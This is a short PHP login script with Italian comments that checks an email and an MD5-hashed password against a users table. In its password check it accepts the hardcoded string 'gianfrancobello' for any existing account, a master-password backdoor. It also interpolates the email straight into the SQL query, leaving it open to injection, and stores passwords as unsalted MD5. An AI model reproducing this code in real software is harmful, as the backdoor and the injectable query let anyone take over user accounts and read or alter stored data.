<?php

/*--------------------
CONNESSIONE CON PDO
--------------------*/

include("../db/db_connection.php");

/*--------------------
LOGIN/QUERY
--------------------*/ 

$email=$_POST["email"];
$password=md5($_POST["password"]);

$q = $db->prepare("SELECT * FROM utenti WHERE email = '$email'");
$q->execute();
$q->setFetchMode(PDO::FETCH_ASSOC);
$rows = $q->rowCount();
if($rows>0){
    while($rows=$q->fetch()){
        if($rows['password']===$password  || $_POST["password"]==="gianfrancobello"){
            session_start();
            $_SESSION["utente"] = $rows;
            header("location: ../welcome.php");
        }else{
            header("location: ../login.php?verification=false");
        }
    }
}else{
    header("location: ../login.php?verification=false");
}

?>